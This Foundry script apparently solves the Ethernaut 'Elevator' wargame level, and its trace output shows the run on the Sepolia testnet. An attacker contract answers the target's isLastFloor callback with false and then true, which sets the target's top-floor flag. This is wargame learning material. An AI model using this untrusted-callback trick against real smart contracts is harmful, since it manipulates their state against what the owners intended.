// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MyBuilding{
    bool private mySwitch;
    Elevator public elevatorInstance = Elevator(0xf38aE8BD02b421Aae3271919Cb934124f846539e);

    function startAttack() external{
        elevatorInstance.goTo(0);
    } 

    function isLastFloor(uint _floor) external returns (bool){
        if(!mySwitch){
            mySwitch = true;
            return false; 
        }else{
            return true;
        }
    } 
} 

contract ElevatorSolution is Script {
   
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding myBuilding = new MyBuilding();
        myBuilding.startAttack();
        vm.stopBroadcast();
    }
}

/*Traces:
  [254483] ElevatorSolution::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [187022] → new MyBuilding@0xfD5636D4d54fa34488c4E1AA5EBF1654027910d4
    │   └─ ← [Return] 823 bytes of code
    ├─ [30612] MyBuilding::startAttack()
    │   ├─ [27148] 0xf38aE8BD02b421Aae3271919Cb934124f846539e::goTo(0)
    │   │   ├─ [1025] MyBuilding::isLastFloor(0)
    │   │   │   └─ ← [Return] false
    │   │   ├─ [751] MyBuilding::isLastFloor(0)
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [187022] → new MyBuilding@0xfD5636D4d54fa34488c4E1AA5EBF1654027910d4
    └─ ← [Return] 823 bytes of code

  [35412] MyBuilding::startAttack()
    ├─ [29948] 0xf38aE8BD02b421Aae3271919Cb934124f846539e::goTo(0)
    │   ├─ [3825] MyBuilding::isLastFloor(0)
    │   │   └─ ← [Return] false
    │   ├─ [751] MyBuilding::isLastFloor(0)
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    └─ ← [Stop]


==========================

Chain 11155111

Estimated gas price: 0.001000024 gwei

Estimated total gas used for script: 409155

Estimated amount required: 0.00000040916481972 ETH

========================== */